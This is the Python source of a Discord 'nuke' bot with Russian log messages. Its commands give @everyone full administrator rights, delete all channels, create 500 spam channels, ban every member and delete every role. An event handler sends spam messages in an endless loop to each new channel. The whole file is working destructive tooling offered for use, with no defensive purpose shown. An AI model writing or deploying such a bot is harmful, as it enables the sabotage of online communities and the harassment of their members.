import discord
from discord.ext import commands
from discord import Permissions
from config import token, prefix, spam_channel, spam_message
import random
from colorama import Fore, init
init()


bot = commands.Bot(command_prefix = prefix, intents=discord.Intents.all(), help_command=None) #не забудь включить все 3 галочки в Privileged Gateway Intents

purple = Fore.MAGENTA
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
yellow = Fore.YELLOW

@bot.event
async def on_ready():
	print(green + f"Подключен: {bot.user.name}#{bot.user.discriminator}")
	print(blue + f"\n{prefix}hi - nuke the server.\n{prefix}ban - ban everyone.\n{prefix}roles - delete all roles.")
	print(yellow + "\n2021-2023. Koriss")


@bot.command()
async def hi(ctx):
	await ctx.message.delete()
	guild = ctx.guild
	try:
		giveEveryoneAdmin = discord.utils.get(guild.roles, name = "@everyone")
		await giveEveryoneAdmin.edit(permissions = Permissions.all())
		print(purple + "\nУспешно выдал всем админку.")
	except:
		print(red + "\nНе получилось выдать всем админку.")
	for channel in guild.channels:
		try:
			await channel.delete()
			print(green + f"{channel.name} удален.")
		except:
			print(red + f"{channel.name} не получилось удалить.")
	for i in range(500):
		await guild.create_text_channel(random.choice(spam_channel))

@bot.command()
async def ban(ctx):
	await ctx.message.delete()
	guild = ctx.guild
	for member in guild.members:
		try:
			await member.ban()
			print(purple + f"{member.name}#{member.discriminator} забанен.")
		except:
			print(red + f"{member.name}#{member.discriminator} не получилось забанить.")

@bot.command()
async def roles(ctx):
	await ctx.message.delete()
	guild = ctx.guild
	for role in guild.roles:
		try:
			await role.delete()
			print(yellow + f"{role.name} роль удалена.")
		except:
			print(red + f"{role.name} не получилось удалить.")

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spam_message))

bot.run(token)